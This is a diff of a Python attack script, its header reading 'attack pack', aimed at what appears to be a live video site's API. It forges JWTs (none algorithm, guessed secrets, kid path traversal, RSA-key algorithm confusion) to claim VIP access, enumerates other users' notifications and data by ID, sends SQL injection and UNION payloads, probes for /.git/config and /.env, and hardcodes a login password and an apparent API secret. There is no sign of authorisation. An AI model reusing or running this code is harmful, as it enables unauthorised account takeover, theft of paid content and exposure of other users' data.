@@ -1,5 +1,5 @@
 # -*- coding: utf-8 -*-
-"""攻击包 v2: JWT 算法混淆 + IDOR 越权 + 二次注入/编码绕过"""
+"""攻击包 v2 mode 版: jwt / idor / proj 分模式(窗口内专注)"""
 
 import urllib.request, urllib.parse, json, time, sys, ssl, base64, hmac, hashlib
 
@@ -38,6 +38,7 @@ def req(method, path, data=None, headers=None, timeout=12):
 
 
 shard = int(sys.argv[1]) if len(sys.argv) > 1 else 1
+mode = sys.argv[2] if len(sys.argv) > 2 else "jwt"
 res = []
 
 
@@ -57,8 +58,10 @@ def make_jwt(alg, payload, key=None):
     return p1 + "." + p2 + ".x"
 
 
-# 1. JWT 算法混淆攻击
-log("=== JWT 攻击 ===")
+PUB_B64 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsoA9UZOV8b0G/kntXw8WKZpH2rp0KQIEoSmM8IMmOcYhvGjlEvSKs+30+XxUDP+7TIvIP/grz/ORQMHVhVM9EmVLR+GK/PawUXLjdYykSNI4D7Ce0/aW29DF1jVBGBCoe/jpV+3rwXN4eM6ScMaQT9+cQB4hN2VQn4Zcwkd8lw9UZKxdiuF2rbCmasG9s5/p5mtAbYDsq7s1D4WP9VwWhoRKVebuiVuXoF0wps8XeMTxmX8uLLqR8TGLzPvHWkyhAnwixnV3eKf2lGwraEJs0j0WVKRuv3iWz8sGaT/thwXyroRgKfTctjqinI1Kc+hn+TMhsUrnnJHbS8M9KZqK7QIDAQAB"
+PUB_PEM = "-----BEGIN PUBLIC KEY-----\n" + PUB_B64 + "\n-----END PUBLIC KEY-----"
+PUB_DER = base64.b64decode(PUB_B64)
+
 vip_payload = {
     "sub": 686285,
     "role": "user",
@@ -66,250 +69,120 @@ vip_payload = {
     "vip_level": 4,
     "svip": 1,
     "expiry_at": "2099-01-01 00:00:00",
+    "is_downloaded": True,
 }
-keys = [
-    "secret",
-    "loivip.com",
-    "moegoat",
-    "loibus",
-    "123456",
-    "password",
-    "loibus-sec-decoy-salt-v1",
-    "loibus-web-request-id-v1",
-    "loiship",
-    "sk-4fugxKBcZcnHptd6LJrJcBaRQv8UXwBLXW7diPie6tVuMb5PbU4LZF2lQxIIPkG7",
-]
-jwts = [("none", make_jwt("none", vip_payload))]
-for k in keys:
-    jwts.append(("HS256:" + k[:12], make_jwt("HS256", vip_payload, k)))
-# kid 注入
-jwts.append(
-    (
-        "kid-path",
-        b64u(b'{"alg":"HS256","typ":"JWT","kid":"../../../../etc/passwd"}')
-        + "."
-        + b64u(json.dumps(vip_payload).encode())
-        + ".x",
-    )
-)
-jwts.append(
-    (
-        "kid-null",
-        b64u(b'{"alg":"HS256","typ":"JWT","kid":null}')
-        + "."
-        + b64u(json.dumps(vip_payload).encode())
-        + ".x",
-    )
-)
-# 算法混淆: 用 JS 里的 RSA 公钥作为 HS256 密钥
-PUB_B64 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsoA9UZOV8b0G/kntXw8WKZpH2rp0KQIEoSmM8IMmOcYhvGjlEvSKs+30+XxUDP+7TIvIP/grz/ORQMHVhVM9EmVLR+GK/PawUXLjdYykSNI4D7Ce0/aW29DF1jVBGBCoe/jpV+3rwXN4eM6ScMaQT9+cQB4hN2VQn4Zcwkd8lw9UZKxdiuF2rbCmasG9s5/p5mtAbYDsq7s1D4WP9VwWhoRKVebuiVuXoF0wps8XeMTxmX8uLLqR8TGLzPvHWkyhAnwixnV3eKf2lGwraEJs0j0WVKRuv3iWz8sGaT/thwXyroRgKfTctjqinI1Kc+hn+TMhsUrnnJHbS8M9KZqK7QIDAQAB"
-PUB_PEM = "-----BEGIN PUBLIC KEY-----\n" + PUB_B64 + "\n-----END PUBLIC KEY-----"
-try:
-    PUB_DER = base64.b64decode(PUB_B64)
-except Exception:
-    PUB_DER = b""
-jwts.append(("confuse-pem", make_jwt("HS256", vip_payload, PUB_PEM)))
-jwts.append(("confuse-b64", make_jwt("HS256", vip_payload, PUB_B64)))
-jwts.append(("confuse-der", make_jwt("HS256", vip_payload, PUB_DER.decode("latin1"))))
-jwts.append(
-    (
-        "confuse-rs256",
-        b64u(b'{"alg":"RS256","typ":"JWT"}')
-        + "."
-        + b64u(json.dumps(vip_payload).encode())
-        + ".x",
-    )
-)
-for name, t in jwts:
-    st, b = req(
-        "GET",
-        "/api/user/loi/online_play_v2/6422",
-        headers={"Authorization": "Bearer " + t},
-    )
-    res.append({"t": "jwt-" + name, "s": st, "b": b[:200]})
-    log("jwt %s: %s %s" % (name, st, b[:80].replace("\n", " ")))
-    time.sleep(0.4)
 
-# 2. IDOR 越权
-log("=== IDOR ===")
-st, body = req(
-    "POST", "/api/user/login", {"email": "3124323585@qq.com", "password": "9876543210."}
-)
-tok = ""
-if st == 200:
-    tok = (json.loads(body).get("access_token") or "").replace("bearer ", "")
-H = {"Authorization": "Bearer " + tok}
-time.sleep(1)
-idor_tests = [
-    ("GET", "/api/user/info?user_id=1", H),
-    ("GET", "/api/user/info?user_id=2", H),
-    ("GET", "/api/user/mydownloaded?user_id=1", H),
-    ("GET", "/api/user/mydownloaded?user_id=2", H),
-    ("GET", "/api/user/mylikes?user_id=1", H),
-    ("GET", "/api/user/notifications?user_id=1", H),
-    ("GET", "/api/comment/1?page=1", H),
-    ("GET", "/api/comment/2?page=1", H),
-    ("GET", "/api/user/loi/download_v6/6422?user_id=1", H),
-    ("GET", "/api/user/subscribed/list?user_id=1", H),
-]
-for method, path, hdrs in idor_tests:
-    st, b = req(method, path, headers=hdrs)
-    res.append({"t": "idor-" + path, "s": st, "b": b[:250]})
-    log("idor %s: %s %s" % (path[:50], st, b[:90].replace("\n", " ")))
-    time.sleep(0.4)
-
-# 2b. IDOR 通知越权深挖 (user_id 枚举)
-log("=== 通知越权 ===")
-for uid in [1, 2, 3, 5, 10, 100, 1000, 686285, 236238]:
-    st, b = req("GET", "/api/user/notifications?user_id=%d" % uid, headers=H)
-    res.append({"t": "notif-%d" % uid, "s": st, "b": b[:400]})
-    log("notif uid=%d: %s %s" % (uid, st, b[:130].replace("\n", " ")))
-    time.sleep(0.4)
-
-# 2c. 历史/其他用户接口
-log("=== 历史/杂项 ===")
-misc_tests = [
-    ("GET", "/api/user/history?page=1", H),
-    ("GET", "/api/user/history", H),
-    ("POST", "/api/user/history", {}),
-    ("GET", "/api/user/oldUserCheck", H),
-    ("GET", "/api/user/mylikes?page=1", H),
-    ("GET", "/api/user/loi/like/6422", H),
-    ("POST", "/api/user/loi/like", {"loi_id": 6422}),
-    ("GET", "/api/user/mydownloaded?page=1", H),
-    ("GET", "/api/user/subscribed/list?page=1", H),
-    ("GET", "/api/user/category/info/1", H),
-    ("GET", "/api/user/tag/info/1", H),
-]
-for method, path, hdrs in misc_tests:
-    st, b = req(method, path, headers=hdrs)
-    res.append({"t": "misc-" + path[:40], "s": st, "b": b[:300]})
-    log("misc %s: %s %s" % (path[:45], st, b[:110].replace("\n", " ")))
-    time.sleep(0.4)
-
-# 2d. 字段投影攻击 (include/fields 尝试返回视频字段)
-log("=== 字段投影 ===")
-proj_urls = [
-    "/api/lois/6422?include=video",
-    "/api/lois/6422?include=video_url",
-    "/api/lois/6422?with=video",
-    "/api/lois/6422?fields=video,images",
-    "/api/lois/6422?expand=video",
-    "/api/lois/6422?embed=video",
-    "/api/lois?page=1&include=video",
-    "/api/lois?page=1&with=video_url",
-    "/api/user/loi/download_v6/6422?include=url",
-    "/api/user/loi/online_play_v2/6422?include=video",
-    "/api/lois/6422?include[]=video",
-    "/api/lois/6422?select=*",
-]
-for path in proj_urls:
-    st, b = req("GET", path, headers=H)
-    got_video = "video" in b.lower() and "60001" not in b
-    res.append({"t": "proj-" + path[:50], "s": st, "b": b[:300]})
-    log(
-        "proj %s: %s %s%s"
-        % (path[:55], st, b[:100].replace("\n", " "), " <<<VIDEO!" if got_video else "")
-    )
-    time.sleep(0.4)
-
-# 3. 二次注入/编码绕过
-log("=== 编码注入 ===")
-enc_tests = [
-    ("/api/lois/6422%2527", "double-quote"),
-    ("/api/lois/%36%34%32%32", "hex"),
-    ("/api/lois/6422%00", "null"),
-    ("/api/lois/6422%20OR%201=1", "space-or"),
-    ("/api/lois/6422%09", "tab"),
-    ("/api/lois?page=%31%27", "enc-page-quote"),
-    (
-        "/api/lois?page=1%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
-        "union-null",
-    ),
-    ("/api/lois?page=1%20AND%20(SELECT%201%20FROM%20users%20LIMIT%201)=1", "subquery"),
-    ("/api/lois?sort=IF(1=1,id,title)", "func-inject"),
-    ("/api/lois?sort=json_extract(1,1)", "json-func"),
-    ("/api/lois?page=1&order=id%20DESC%20LIMIT%201", "order-limit"),
-]
-for path, name in enc_tests:
-    st, b = req("GET", path, headers=H)
-    res.append({"t": "enc-" + name, "s": st, "b": b[:250]})
-    log("enc %s: %s %s" % (name, st, b[:80].replace("\n", " ")))
-    time.sleep(0.4)
-
-# 4. 未鉴权端点扫描
-log("=== 匿名端点 ===")
-anon_tests = [
-    ("GET", "/api/lois/6422"),
-    ("GET", "/api/sp_list"),
-    ("GET", "/api/comment/6422?page=1"),
-    ("GET", "/api/lois?page=1&sort=new"),
-    ("GET", "/api/user/info"),
-    ("GET", "/api/tags"),
-    ("GET", "/api/categories"),
-    ("GET", "/api/site-info"),
-    ("GET", "/api/config"),
-]
-for method, path in anon_tests:
-    st, b = req(method, path)
-    res.append({"t": "anon-" + path, "s": st, "b": b[:250]})
-    log("anon %s: %s %s" % (path[:45], st, b[:80].replace("\n", " ")))
-    time.sleep(0.4)
-
-# 5. images.moegoat.com 路径枚举
-log("=== images 枚举 ===")
-img_paths = [
-    "/",
-    "/robots.txt",
-    "/.git/config",
-    "/.env",
-    "/upload/",
-    "/uploads/",
-    "/video/",
-    "/videos/",
-    "/media/",
-    "/storage/",
-    "/files/",
-    "/download/",
-    "/img/",
-    "/images/",
-    "/video/1.mp4",
-    "/videos/1.mp4",
-    "/list",
-    "/index.json",
-]
-for pp in img_paths:
-    url = "https://images.moegoat.com" + pp
-    try:
-        rq = urllib.request.Request(
-            url, headers={"User-Agent": UA, "Referer": "https://loiship.com/"}
+if mode == "jwt":
+    log("=== JWT 算法混淆 ===")
+    tokens = [
+        ("pem", make_jwt("HS256", vip_payload, PUB_PEM)),
+        ("b64", make_jwt("HS256", vip_payload, PUB_B64)),
+        ("der", make_jwt("HS256", vip_payload, PUB_DER.decode("latin1"))),
+        ("b64x2", make_jwt("HS256", vip_payload, PUB_B64 + PUB_B64)),
+        ("none", make_jwt("none", vip_payload)),
+        (
+            "rs256-raw",
+            b64u(b'{"alg":"RS256","typ":"JWT"}')
+            + "."
+            + b64u(json.dumps(vip_payload).encode())
+            + ".x",
+        ),
+        ("hmac-empty", make_jwt("HS256", vip_payload, "")),
+        ("hmac-space", make_jwt("HS256", vip_payload, " ")),
+        (
+            "hmac-jwk",
+            make_jwt("HS256", vip_payload, '{"kty":"RSA","n":"' + PUB_B64[:50] + '"}'),
+        ),
+        ("normal-valid", None),
+    ]
+    for name, t in tokens:
+        if t is None:
+            # 用真实 token 对照
+            st, body = req(
+                "POST",
+                "/api/user/login",
+                {"email": "3124323585@qq.com", "password": "9876543210."},
+            )
+            if st == 200:
+                tok = (json.loads(body).get("access_token") or "").replace(
+                    "bearer ", ""
+                )
+                st2, b = req(
+                    "GET",
+                    "/api/user/loi/online_play_v2/6422",
+                    headers={"Authorization": "Bearer " + tok},
+                )
+                res.append({"t": "jwt-" + name, "s": st2, "b": b[:200]})
+                log("jwt %s(真实): %s %s" % (name, st2, b[:100]))
+            continue
+        st, b = req(
+            "GET",
+            "/api/user/loi/online_play_v2/6422",
+            headers={"Authorization": "Bearer " + t},
         )
-        resp = urllib.request.urlopen(
-            rq, timeout=10, context=ssl.create_default_context()
+        res.append({"t": "jwt-" + name, "s": st, "b": b[:200]})
+        log("jwt %s: %s %s" % (name, st, b[:100].replace("\n", " ")))
+        if st == 200 and "60001" not in b:
+            log(">>>>>>> 突破!!! %s" % b[:400])
+        time.sleep(0.5)
+
+elif mode == "idor":
+    log("=== IDOR/通知 ===")
+    st, body = req(
+        "POST",
+        "/api/user/login",
+        {"email": "3124323585@qq.com", "password": "9876543210."},
+    )
+    tok = ""
+    if st == 200:
+        tok = (json.loads(body).get("access_token") or "").replace("bearer ", "")
+    H = {"Authorization": "Bearer " + tok}
+    time.sleep(1)
+    for uid in [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12]:
+        st, b = req("GET", "/api/user/notifications?user_id=%d" % uid, headers=H)
+        res.append({"t": "notif-%d" % uid, "s": st, "b": b[:400]})
+        log("notif uid=%d: %s %s" % (uid, st, b[:150].replace("\n", " ")))
+        time.sleep(0.5)
+
+elif mode == "proj":
+    log("=== 字段投影 ===")
+    st, body = req(
+        "POST",
+        "/api/user/login",
+        {"email": "3124323585@qq.com", "password": "9876543210."},
+    )
+    tok = ""
+    if st == 200:
+        tok = (json.loads(body).get("access_token") or "").replace("bearer ", "")
+    H = {"Authorization": "Bearer " + tok}
+    time.sleep(1)
+    paths = [
+        "/api/lois/6422?include=video",
+        "/api/lois/6422?with=video",
+        "/api/lois/6422?fields=video,images",
+        "/api/lois/6422?expand=video",
+        "/api/lois/6422?embed=video",
+        "/api/lois/6422?select=*",
+        "/api/lois/6422?include[]=video",
+        "/api/lois/6422?extra=video",
+        "/api/lois/6422?full=1",
+        "/api/lois/6422?deep=1",
+        "/api/lois?page=1&include=video",
+        "/api/lois?page=1&with=video_url",
+    ]
+    for path in paths:
+        st, b = req("GET", path, headers=H)
+        got = "video" in b.lower() and "60001" not in b and "video_count" not in b
+        res.append({"t": "proj-" + path[:45], "s": st, "b": b[:300]})
+        log(
+            "proj %s: %s %s%s"
+            % (path[:50], st, b[:100].replace("\n", " "), " <<<VIDEO!" if got else "")
         )
-        data = resp.read(64)
-        res.append({"t": "img-" + pp, "s": resp.status, "b": data[:40].hex()})
-        log("img %s: %s %s" % (pp, resp.status, data[:8].hex()))
-    except urllib.error.HTTPError as e:
-        res.append({"t": "img-" + pp, "s": e.code, "b": ""})
-        log("img %s: %s" % (pp, e.code))
-    except Exception as e:
-        res.append({"t": "img-" + pp, "s": "EXC", "b": type(e).__name__})
-        log("img %s: EXC %s" % (pp, type(e).__name__))
-    time.sleep(0.3)
-try:
-    url = "https://images.moegoat.com/HffjWfqcYwQMXlWaFidl3BkFPVwO3TS6pfadK6ST.jpg"
-    rq = urllib.request.Request(url, headers={"User-Agent": UA})
-    resp = urllib.request.urlopen(rq, timeout=10, context=ssl.create_default_context())
-    res.append({"t": "img-noref", "s": resp.status, "b": ""})
-    log("img noreferer: %s" % resp.status)
-except urllib.error.HTTPError as e:
-    res.append({"t": "img-noref", "s": e.code, "b": ""})
-    log("img noreferer: %s" % e.code)
+        time.sleep(0.5)
 
 with open("sqli2_%d.jsonl" % shard, "w", encoding="utf-8") as f:
     for r in res:
         f.write(json.dumps(r, ensure_ascii=False) + "\n")
 with open("sqli2_%d.txt" % shard, "w", encoding="utf-8") as f:
     f.write("\n".join(out))
-log("v2 shard%d done" % shard)
+log("v2 %s shard%d done" % (mode, shard))
